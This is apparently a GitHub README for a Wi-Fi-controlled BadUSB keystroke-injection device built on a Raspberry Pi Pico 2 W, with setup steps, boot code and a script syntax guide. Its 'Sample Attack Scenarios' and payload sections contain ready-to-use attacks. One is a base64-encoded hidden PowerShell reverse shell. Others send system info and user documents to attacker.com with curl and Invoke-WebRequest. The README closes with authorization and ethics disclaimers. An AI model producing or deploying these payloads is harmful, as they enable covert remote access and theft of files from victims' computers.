# KEYOES BadUSB Controller

A powerful BadUSB controller for Raspberry Pi Pico 2 W with a web interface for remote payload management.

## 🔥 Features

- **Web-based interface** for uploading and executing BadUSB payloads
- **Wifi connectivity** for remote control
- **Enhanced keyboard simulation** with improved timing
- **Command history** and payload logging
- **Fully responsive UI** with Kali Linux-inspired terminal design
- **RESTful API** for programmatic control

## 📋 Prerequisites

Before getting started, you'll need:

- Raspberry Pi Pico 2 W
- Micro USB cable
- Computer with CircuitPython installation capability

## 🛠️ Installation Guide

### Step 1: Flash CircuitPython to your Pico
Removing Existing Firmware ex(MicroPython)
If your Raspberry Pi Pico 2 W already has MicroPython, FlashNuke, or other firmware installed, you should remove it first:

Download the Raspberry Pi Pico 2 W








Flash Reset tool (flash_nuke.uf2)
Press and hold the BOOTSEL button on your Raspberry Pi Pico 2 W
While holding the button, connect the Pico to your computer via USB
Release the button once connected
Your Pico should mount as a USB drive named "RPI-RP2"
Drag and drop the flash_nuke.uf2 file onto the RPI-RP2 drive
The Pico will automatically restart, erasing its memory completely
After a brief pause, it will remount as "RPI-RP2" again, ready for new firmware

### Step 2: Flash CircuitPython to your Pico

1. Press and hold the **BOOTSEL** button on your Raspberry Pi Pico 2 W
2. While holding the button, connect the Pico to your computer via USB
3. Release the button once connected
4. Your Pico should mount as a USB drive named "RPI-RP2"
5. Download the latest [CircuitPython UF2 file for Raspberry Pi Pico 2 W](https://circuitpython.org/board/raspberry_pi_pico2_w/)
6. Drag and drop the .UF2 file onto the RPI-RP2 drive
7. The Pico will automatically restart and mount as a new drive named "CIRCUITPY"

### Step 3: Install Required Libraries

1. Download the CircuitPython library bundle that matches your CircuitPython version from the [CircuitPython libraries page](https://circuitpython.org/libraries) (9.2.7 or latest)
2. Extract the bundle and copy the following libraries to the `lib` folder on your CIRCUITPY drive:
   - adafruit_hid (its a folder)
   - adafruit_httpserver (its a folder)
   - adafruit_request.mpy
   - adafruit_ticks.mpy
   - ducky_interpreter.py

### Step 4: Copy the Code Files

1. Create `boot.py` in the root of your CIRCUITPY drive and paste the following code:

```python
# boot.py - Rulează la pornirea dispozitivului pentru a configura USB HID

import storage
import usb_cdc
import usb_hid
import board
import digitalio
import time

# Configurare LED pentru a indica statusul la inițializare
led = digitalio.DigitalInOut(board.LED)
led.direction = digitalio.Direction.OUTPUT

# Aprinde LED-ul pentru a indica că boot.py se execută
led.value = True

# Activăm modul USB HID pentru a permite Pico să se comporte ca o tastatură
usb_cdc.disable()  # Dezactivăm consola serială pentru a evita conflicte
storage.disable_usb_drive()  # Dezactivăm modul de stocare USB

# Stingem LED-ul pentru a indica finalizarea configurării
led.value = False

# Un blink scurt pentru a confirma că boot.py s-a executat cu succes
time.sleep(0.2)
led.value = True
time.sleep(0.2)
led.value = False
```

2. Create `code.py` in the root of your CIRCUITPY drive and paste the code from [code.py](code.py)

3. Edit the WiFi credentials in `code.py`:
   ```python
   # Parametri WiFi - schimbați cu datele voastre
   WIFI_SSID = "YourWiFiName"
   WIFI_PASSWORD = "YourWiFiPassword"
   ```

### Step 4: Safe Ejection and First Boot

1. Safely eject your CIRCUITPY drive
2. Disconnect and reconnect your Pico
3. The device will boot and run the BadUSB controller script

#### LED Status Indicators
- **3 quick blinks at start**: System initialization
- **Rapid blinking (10 times)**: WiFi connection failed
- **One long blink**: Server started successfully
- **5 quick blinks**: Server failed to start
- **LED on during command execution**: Command being executed

## 📱 Connecting to the Web Interface

1. Connect your Raspberry Pi Pico 2 W to a USB power source
2. The device will connect to your configured WiFi network
3. Find the IP address of your device:
   - Check your router's connected devices list
   - Use an IP scanner on your network
4. Open a web browser and navigate to the IP address (e.g., `http://192.168.1.100`)
5. The KEYOES BadUSB Controller interface should load

## 💻 Using the Controller

### Web Interface

The web interface provides a terminal-like experience with the following features:

- **Script Editor**: Write or paste your BadUSB scripts
- **Upload Button**: Saves the script to the device
- **Execute Button**: Runs the saved script
- **Clear Button**: Clears the script editor
- **Command History**: Shows previous commands and their status
- **Payloads Log**: Records executed payloads (accessed by clicking the "Payloads Log" tab)

### Script Syntax

The BadUSB controller supports the following commands:

```
STRING <text>           # Types the specified text
DELAY <milliseconds>    # Waits for the specified time in milliseconds
CHAR_DELAY <ms>         # Sets the delay between keystrokes (default: 10ms)
REM <comment>           # Comment (not executed)
// <comment>            # Alternative comment syntax

# Key commands
<key>                   # Presses a single key (e.g., ENTER, SPACE, TAB)
<key1>+<key2>+<key3>    # Presses a key combination (e.g., CTRL+ALT+T)
```

Example script:
```
REM Open command prompt in Windows
GUI+r
DELAY 500
STRING cmd
ENTER
DELAY 1000
STRING echo Hello, this is a BadUSB example!
ENTER
```

### API Access (NOT TESTED YET)

For programmatic control, you can use the API endpoint:

```
POST http://<pico-ip>/api/badusb
```

With JSON payload:
```json
{
  "action": "upload",
  "script": "STRING Hello World\nDELAY 500\nENTER"
}
```

Or:
```json
{
  "action": "execute"
}
```

KEYOES BadUSB Controller

A sophisticated BadUSB implementation leveraging the Raspberry Pi Pico 2 W microcontroller, offering remote execution capabilities through an intuitive web interface inspired by the Kali Linux terminal aesthetic.

## Overview

KEYOES BadUSB Controller transforms your Raspberry Pi Pico 2 W into a versatile Human Interface Device (HID) that can be remotely controlled over Wi-Fi. This project implements a complete attack framework for security testing and administrative task automation, featuring real-time monitoring, payload management, and comprehensive API access.

## Features

- **Advanced HID Emulation**: Full keyboard emulation with support for complex key combinations and timing precision
- **Web-based Control Interface**: Terminal-like environment for creating, editing, and executing HID attacks
- **Command Syntax**: Compatible with Ducky Script syntax with extended capabilities
- **Payload History**: Track and reuse previously executed attacks
- **RESTful API**: Programmatic access for integration with other security tools and frameworks
- **Real-time Status Monitoring**: Wi-Fi connection status and execution feedback
- **Visual Feedback**: LED indicators for system status and operation confirmation

## Usage Guide

### Web Interface Navigation

After deployment and connection, access the web interface by navigating to the device's IP address. The interface consists of two primary tabs:

1. **Terminal Tab**: For creating and executing BadUSB payloads
2. **Payloads Log Tab**: For reviewing previously executed payloads

#### Terminal Tab Controls

- **Script Editor**: Central textarea for entering Ducky Script commands
- **Upload Button**: Sends the current script to the device's memory
- **Execute Button**: Runs the currently loaded script
- **Clear Button**: Erases the script editor content
- **Command History**: Shows recently executed commands and their status

#### Keyboard Shortcuts

- `Ctrl+T`: Switch to Terminal tab
- `Ctrl+P`: Switch to Payloads Log tab

### Command Syntax Reference

KEYOES BadUSB Controller supports an extended version of the Ducky Script language with additional timing controls:

```
REM This is a comment
DELAY 1000             // Wait for 1000ms
STRING echo "Hello"    // Type the text literally
ENTER                  // Press the Enter key
CTRL+ALT+DELETE        // Press key combination (space-separated)
CTRL+ALT+T             // Alternative combination syntax
CHAR_DELAY 50          // Set delay between keystrokes to 50ms
```

#### Core Commands

| Command      | Description                                 |  Example               |
|--------------|---------------------------------------------|------------------------|
| `STRING`     | Types the specified text                    | `STRING Hello, world!` |
| `DELAY`      | Pauses execution for specified milliseconds | `DELAY 500`            |
| `CHAR_DELAY` | Sets typing speed (ms between characters)   | `CHAR_DELAY 25`        |
| `REM`        | Comment (ignored during execution)          | `REM Opening terminal` |

#### Special Keys

The controller supports all standard keyboard keys, including:

- Modifiers: `CTRL`, `SHIFT`, `ALT`, `GUI` (Windows key)
- Function keys: `F1` through `F12`
- Navigation: `UP`, `DOWN`, `LEFT`, `RIGHT`, `HOME`, `END`, `PAGEUP`, `PAGEDOWN`
- System keys: `ESC`, `TAB`, `CAPSLOCK`, `PRINTSCREEN`, `DELETE`, etc.

### Payload Development Best Practices

#### Timing Optimization

Fine-tune your attack payloads with strategic timing:

```
CHAR_DELAY 20    // Fast typing for simple text
STRING cd /tmp && mkdir test
ENTER
DELAY 500        // Allow system time to process command
CHAR_DELAY 50    // Slower typing for complex passwords or commands
STRING sudo ./execute_critical_operation.sh
ENTER
```

#### Target-Specific Adaptations

Adjust your payloads based on the target operating system:

- **Windows**: Use `GUI+r` to open Run dialog, then execute commands
- **macOS**: Use `GUI+SPACE` to open Spotlight, then launch applications
- **Linux**: Use `CTRL+ALT+T` to open terminal on many distributions

#### Multi-phase Payloads

Implement sophisticated attacks through payload sequencing:

```
REM Phase 1: Reconnaissance
GUI+r
DELAY 200
STRING cmd
ENTER
DELAY 500
STRING systeminfo > %TEMP%\sysinfo.txt
ENTER

REM Phase 2: Exfiltration
DELAY 1000
STRING powershell -W Hidden -c "Invoke-WebRequest -Uri 'http://attacker.com/upload' -Method POST -InFile $env:TEMP\sysinfo.txt"
ENTER
```

### API Integration

Access the controller programmatically through the RESTful API:

#### Execute Payload via API

```python
import requests

payload = """
DELAY 1000
CTRL+ALT+T
DELAY 500
STRING echo "API Execution Test"
ENTER
"""

# Direct script execution
response = requests.post("http://[DEVICE_IP]/api/badusb", data=payload)
print(response.text)

# JSON-based command
command = {
    "action": "upload",
    "script": payload
}
response = requests.post("http://[DEVICE_IP]/api/badusb", json=command)
print(response.json())
```

#### API Endpoints (NOT TESTED YET )

| Endpoint       | Method     | Description                      |
|----------------|------------|----------------------------------|
| `/api/badusb`  | POST       | Upload and/or execute scripts    |
| `/wifi-status` | GET        | Check device connectivity status |

## Advanced Usage Scenarios

### Red Team Operations

- **Initial Access**: Deploy payloads that establish persistence on target systems
- **Lateral Movement**: Execute commands that enable access to other networked systems
- **Data Exfiltration**: Automate the collection and transmission of sensitive information

### System Administration

- **Automated Configuration**: Deploy standardized configurations across multiple systems
- **Scheduled Maintenance**: Execute routine maintenance tasks requiring privileged access
- **Software Deployment**: Automate software installation processes across workstations

### Security Testing

- **Phishing Simulation**: Demonstrate the dangers of connecting unknown USB devices
- **Policy Compliance**: Test enforcement of security policies regarding USB devices
- **Incident Response Training**: Create realistic scenarios for security team exercises

## Sample Attack Scenarios

### Windows PowerShell Reverse Shell

```
REM Windows PowerShell Reverse Shell
DELAY 1000
GUI+r
DELAY 500
STRING powershell -W Hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAiACwANAA0ADMAKQANAAoAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApAA0ACgAkAHcAcgBpAHQAZQByACAAPQAgAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAFMAdAByAGUAYQBtAFcAcgBpAHQAZQByACgAJABzAHQAcgBlAGEAbQApAA0ACgAkAGIAdQBmAGYAZQByACAAPQAgAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEIAeQB0AGUAWwBdACAAMQAwADIANAA7ACQAZQBuAGMAbwBkAGkAbgBnACAAPQAgAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnAA0ACgAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAB7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABlAG4AYwBvAGQAaQBuAGcALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYQByAGcAcwApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgACsAPQAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHcAcgBpAHQAZQByAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAYQBjAGsAMgApAH0ADQAKAHcAaABpAGwAZQAoACQAdAByAHUAZQApAHsAJABiAHkAdABlAHMAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAdQBmAGYAZQByACwAMAAsACQAYgB1AGYAZgBlAHIALgBMAGUAbgBnAHQAaAApADsAJABjAG8AbQBtAGEAbgBkACAAPQAgACQAZQBuAGMAbwBkAGkAbgBnAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAdQBmAGYAZQByACwAMAAsACQAYgB5AHQAZQBzACkAOwBpAGYAKAAkAGMAbwBtAG0AYQBuAGQALgBsAGUAbgBnAHQAaAAgAC0AZwB0ACAAMAApAHsAdAByAHkAewAkAG8AdQB0AHAAdQB0ACAAPQAgAGkAZQB4ACAAJABjAG8AbQBtAGEAbgBkACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnADsAJABzAGUAbgBkAGIAYQBjAGsALgBJAG4AdgBvAGsAZQAoACQAbwB1AHQAcAB1AHQAKQBAAC4AfQBAdAByAHkAewAkAHMAZQBuAGQAYgBhAGMAawAuAEkAbgB2AG8AawBlACgAJABlAHIAcgBvAHIAWwAwAF0AQAAKAG0AZQBzAHMAYQBnAGUAKQB9AH0AfQA=
ENTER
```

### Linux Data Exfiltration

```
REM Linux Data Exfiltration
DELAY 1000
CTRL+ALT+T
DELAY 500
STRING find /home -name "*.xlsx" -o -name "*.docx" -o -name "*.pdf" | while read file; do curl -F "file=@$file" http://attacker.com/upload; done
ENTER
```

### Cross-platform Reconnaissance

```
REM Cross-platform System Info Gatherer
DELAY 1000
GUI+r
DELAY 500
STRING cmd /c "systeminfo > %TEMP%\sysinfo.txt & ipconfig /all >> %TEMP%\sysinfo.txt & net user >> %TEMP%\sysinfo.txt & type %TEMP%\sysinfo.txt | curl -X POST -d @- http://attacker.com/collect"
ENTER
```

## Best Practices for Operational Security

When utilizing this controller for legitimate security testing:

1. **Explicit Authorization**: Always obtain written permission before testing any systems
2. **Scope Definition**: Clearly define testing boundaries and expected outcomes
3. **Evidence Preservation**: Document all testing activities for compliance purposes
4. **Controlled Environment**: Initially test payloads in isolated environments
5. **Data Handling**: Follow proper procedures for any data collected during testing

## Ethics Statement

KEYOES BadUSB Controller is designed for legitimate security testing, system administration, and educational purposes only. Users bear full responsibility for ensuring their usage complies with applicable laws, regulations, and organizational policies.

---

*Note: This README is provided for educational purposes. The capabilities described herein should only be employed in authorized contexts with appropriate safeguards.*
